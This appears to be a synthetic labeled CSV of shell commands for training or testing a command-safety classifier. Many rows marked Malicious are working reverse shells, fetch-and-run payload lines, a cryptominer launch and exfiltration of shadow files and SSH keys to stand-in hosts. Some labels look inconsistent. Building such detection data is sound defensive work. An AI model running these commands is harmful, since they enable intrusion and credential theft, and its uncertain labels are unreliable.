+journalctl -u docker --no-pager -n 20,Benign,Synthetic,Synthetic
+sftp user@server,Benign,Synthetic,Synthetic
+grep -r 'password' /srv/,Context_Dependent,Synthetic,Synthetic
+npm update,Benign,Synthetic,Synthetic
+grep -ri 'api_key' /srv/,Context_Dependent,Synthetic,Synthetic
+nice -n 10 ./build.sh,Benign,Synthetic,Synthetic
+curl -s http://172.16.5.10/agent -o /dev/shm/.proc/.agent && bash /dev/shm/.proc/.agent,Malicious,Synthetic,Synthetic
+chgrp -R www-data /var/www,Benign,Synthetic,Synthetic
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.100.200.1"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
+killall -9 sshd,Context_Dependent,Synthetic,Synthetic
+bash -i >& /dev/tcp/172.16.5.10/1337 0>&1,Malicious,Synthetic,Synthetic
+cat /etc/redhat-release,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/shadow http://attacker.com/collect,Malicious,Synthetic,Synthetic
+"wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",Context_Dependent,Synthetic,Synthetic
+echo $HOSTNAME,Benign,Synthetic,Synthetic
+ip -s link,Benign,Synthetic,Synthetic
+docker run -d --name helper --restart=always xmrig/xmrig -o pool.minexmr.com:4444,Malicious,Synthetic,Synthetic
+go mod tidy,Benign,Synthetic,Synthetic
+wget http://attacker.com/xmrig -O /dev/shm/.x && nohup /dev/shm/.x &,Malicious,Synthetic,Synthetic
+ping -c 3 google.com,Benign,Synthetic,Synthetic
+nano /home/admin/healthcheck.sh,Benign,Synthetic,Synthetic
+cat /etc/os-release,Benign,Synthetic,Synthetic
+curl -F 'file=@/etc/shadow' http://10.0.0.1:8080/upload,Malicious,Synthetic,Synthetic
+"perl -e 'use Socket;$i=""172.16.0.50"";$p=8443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
+bzip2 largefile.log,Benign,Synthetic,Synthetic
+docker logs --tail 200 proxy,Benign,Synthetic,Synthetic
+gpg --list-keys,Benign,Synthetic,Synthetic
+find / -writable -type d 2>/dev/null,Context_Dependent,Synthetic,Synthetic
+ls -lah /var/lib,Benign,Synthetic,Synthetic
+ls -lt /srv/www | head -10,Benign,Synthetic,Synthetic
+wget http://172.16.0.1:8080/implant -O /tmp/.hidden/implant && chmod +x /tmp/.hidden/implant && /tmp/.hidden/implant,Malicious,Synthetic,Synthetic
+pip install flask,Benign,Synthetic,Synthetic
+ls -la /var/www/html,Benign,Synthetic,Synthetic
+ncat -lvnp 1337,Context_Dependent,Synthetic,Synthetic
+dd if=/dev/sda of=/backup/disk.img bs=4M status=progress,Benign,Synthetic,Synthetic
+nc -lvnp 1234,Context_Dependent,Synthetic,Synthetic
+kubectl scale deployment/web --replicas=3,Benign,Synthetic,Synthetic
+cp /opt/services/server.js /opt/services/server.js.bak,Benign,Synthetic,Synthetic
+systemctl status postgresql,Benign,Synthetic,Synthetic
+pidof python,Benign,Synthetic,Synthetic
+sha256sum firmware.bin,Benign,Synthetic,Synthetic
+cat /etc/bash.bashrc,Benign,Synthetic,Synthetic
+"nmap -p 22,80,443 192.168.1.50",Context_Dependent,Synthetic,Synthetic
+pip install --upgrade lodash,Benign,Synthetic,Synthetic
+grep -i 'timeout' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+systemctl status vault,Benign,Synthetic,Synthetic
+sysctl -a | head -20,Benign,Synthetic,Synthetic
+cp /home/user/healthcheck.sh /home/user/healthcheck.sh.bak,Benign,Synthetic,Synthetic
+chown root:root /var/www,Benign,Synthetic,Synthetic
+pkexec /bin/bash,Malicious,Synthetic,Synthetic
+cp /var/lib/main.go /var/lib/main.go.bak,Benign,Synthetic,Synthetic
+docker exec -it web bash,Benign,Synthetic,Synthetic
+systemctl is-active rabbitmq-server,Benign,Synthetic,Synthetic
+ls /tmp/,Benign,Synthetic,Synthetic
+systemctl status logstash,Benign,Synthetic,Synthetic
+env | grep PATH,Benign,Synthetic,Synthetic
+cat /home/user/.ssh/id_rsa | nc 10.0.0.5 31337,Malicious,Synthetic,Synthetic
+kill -HUP $(pidof mysql),Benign,Synthetic,Synthetic
+sudo cat /etc/shadow,Benign,Synthetic,Synthetic
+yarn build,Benign,Synthetic,Synthetic
+vim /tmp/Makefile,Benign,Synthetic,Synthetic
+conda activate myenv,Benign,Synthetic,Synthetic
+ssh admin@production,Benign,Synthetic,Synthetic
+pip install celery,Benign,Synthetic,Synthetic
+ssh -R 1080:localhost:1080 user@external,Context_Dependent,Synthetic,Synthetic
+"perl -e 'use Socket;$i=""192.168.1.1"";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
+systemctl is-active logstash,Benign,Synthetic,Synthetic
+cut -d: -f1 /etc/passwd,Benign,Synthetic,Synthetic
+head -50 /etc/redis/redis.conf,Benign,Synthetic,Synthetic
+hostname -f,Benign,Synthetic,Synthetic
+wget http://10.0.0.5:9090/rev.py -O /var/tmp/rev.py && chmod +x /var/tmp/rev.py && /var/tmp/rev.py,Malicious,Synthetic,Synthetic
+journalctl -u grafana-server --no-pager -n 20,Benign,Synthetic,Synthetic
+du -ah /tmp | sort -rh | head -10,Benign,Synthetic,Synthetic
+cat /etc/lsb-release,Benign,Synthetic,Synthetic
+curl -s http://10.0.0.5/rev.py -o /var/tmp/.rev.py && bash /var/tmp/.rev.py,Malicious,Synthetic,Synthetic
+systemctl restart logstash,Benign,Synthetic,Synthetic
+docker inspect worker,Benign,Synthetic,Synthetic
+apt autoremove -y,Benign,Synthetic,Synthetic
+nmcli connection show,Benign,Synthetic,Synthetic
+docker exec cache ls /app,Benign,Synthetic,Synthetic
+mv /home/user/main.go.old /home/user/main.go,Benign,Synthetic,Synthetic
+pip show fastapi,Benign,Synthetic,Synthetic
+ls -lt /etc/nginx | head -10,Benign,Synthetic,Synthetic
+docker logs -f api,Benign,Synthetic,Synthetic
+docker logs --tail 200 cache,Benign,Synthetic,Synthetic
+curl -sS https://api.github.com | head -5,Benign,Synthetic,Synthetic
+pip install --upgrade pip,Benign,Synthetic,Synthetic
+blkid,Benign,Synthetic,Synthetic
+journalctl -u prometheus --no-pager -n 20,Benign,Synthetic,Synthetic
+make clean && make,Benign,Synthetic,Synthetic
+findmnt -t ext4,Benign,Synthetic,Synthetic
+systemctl disable cups,Benign,Synthetic,Synthetic
+cat /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
+pip install django,Benign,Synthetic,Synthetic
+ls -la /var/log,Benign,Synthetic,Synthetic
+ls -lah /tmp,Benign,Synthetic,Synthetic
+sudo -u www-data bash,Benign,Synthetic,Synthetic
+javac Main.java,Benign,Synthetic,Synthetic
+which java,Benign,Synthetic,Synthetic
+cat /etc/mtab,Benign,Synthetic,Synthetic
+kill -HUP $(pidof gunicorn),Benign,Synthetic,Synthetic
+sudo ufw allow 22,Benign,Synthetic,Synthetic
+python3 -m pytest --cov=src tests/,Benign,Synthetic,Synthetic
+chown -R nginx:nginx /srv/www,Benign,Synthetic,Synthetic
+nano /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
+vim /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
+ssh-add ~/.ssh/id_rsa,Benign,Synthetic,Synthetic
+curl -I https://api.company.com,Benign,Synthetic,Synthetic
+rustc main.rs,Benign,Synthetic,Synthetic
+cp -a /etc/nginx /backup/nginx_$(date +%Y%m%d),Benign,Synthetic,Synthetic
+cp /srv/www/settings.json /srv/www/settings.json.bak,Benign,Synthetic,Synthetic
+nano /var/www/index.html,Benign,Synthetic,Synthetic
+quota -u $USER,Benign,Synthetic,Synthetic
+cp /opt/services/settings.json /opt/services/settings.json.bak,Benign,Synthetic,Synthetic
+nc -lvnp 9001,Context_Dependent,Synthetic,Synthetic
+docker exec -it app bash,Benign,Synthetic,Synthetic
+cp /var/lib/package.json /var/lib/package.json.bak,Benign,Synthetic,Synthetic
+chmod 600 server.js,Benign,Synthetic,Synthetic
+mv /home/user/config.yaml.old /home/user/config.yaml,Benign,Synthetic,Synthetic
+alias ll='ls -la',Benign,Synthetic,Synthetic
+ssh deploy@db-01,Benign,Synthetic,Synthetic
+pip show react,Benign,Synthetic,Synthetic
+curl -s http://172.16.0.1/beacon.sh -o /dev/shm/.proc/.beacon.sh && bash /dev/shm/.proc/.beacon.sh,Malicious,Synthetic,Synthetic
+getcap -r / 2>/dev/null,Malicious,Synthetic,Synthetic
+nmap -sn 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
+crontab -l -u www-data,Benign,Synthetic,Synthetic
+mv /opt/services/app.py.old /opt/services/app.py,Benign,Synthetic,Synthetic
+chmod 755 deploy.sh,Benign,Synthetic,Synthetic
+tar -czf /backup/$(date +%Y%m%d).tar.gz /var/www,Benign,Synthetic,Synthetic
+pip show express,Benign,Synthetic,Synthetic
+base64 /etc/sudoers | curl -d @- http://192.168.56.1:4443/,Malicious,Synthetic,Synthetic
+vim /tmp/main.go,Benign,Synthetic,Synthetic
+nano /opt/services/deploy.sh,Benign,Synthetic,Synthetic
+auditctl -w /etc/passwd -p wa,Context_Dependent,Synthetic,Synthetic
+docker top web,Benign,Synthetic,Synthetic
+yarn add react,Benign,Synthetic,Synthetic
+docker logs --tail 200 app,Benign,Synthetic,Synthetic
+ps aux --sort=-%mem | head -10,Benign,Synthetic,Synthetic
+hostname,Benign,Synthetic,Synthetic
+medusa -h 10.0.0.1 -u admin -P wordlist.txt -M ssh,Context_Dependent,Synthetic,Synthetic
+arp-scan --localnet,Context_Dependent,Synthetic,Synthetic
+du -sh /home/*,Benign,Synthetic,Synthetic
+node server.js,Benign,Synthetic,Synthetic
+"perl -e 'use Socket;$i=""10.0.0.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
+nano /home/user/projects/README.md,Benign,Synthetic,Synthetic
+systemctl status elasticsearch,Benign,Synthetic,Synthetic
+wget http://10.100.200.1:80/rev.py -O /tmp/.hidden/rev.py && chmod +x /tmp/.hidden/rev.py && /tmp/.hidden/rev.py,Malicious,Synthetic,Synthetic
+git merge develop,Benign,Synthetic,Synthetic
+df -h /usr/local/bin,Benign,Synthetic,Synthetic
+traceroute 8.8.8.8,Benign,Synthetic,Synthetic
+docker logs -f cache,Benign,Synthetic,Synthetic
+nano /opt/app/app.py,Benign,Synthetic,Synthetic
+firewall-cmd --state,Benign,Synthetic,Synthetic
+chmod 755 settings.json,Benign,Synthetic,Synthetic
+cp /home/user/nginx.conf /home/user/nginx.conf.bak,Benign,Synthetic,Synthetic
+npx tsc,Benign,Synthetic,Synthetic
+netstat -tunlp,Benign,Synthetic,Synthetic
+cp /tmp/backdoor /usr/local/bin/sshd-helper && chmod +x /usr/local/bin/sshd-helper,Malicious,Synthetic,Synthetic
+du -sh /var/log,Benign,Synthetic,Synthetic
+git blame README.md,Benign,Synthetic,Synthetic
+go build ./...,Benign,Synthetic,Synthetic
+objdump -d /usr/bin/ls | head -30,Benign,Synthetic,Synthetic
+wget -q http://evil.com/backdoor -O /tmp/bd,Context_Dependent,Synthetic,Synthetic
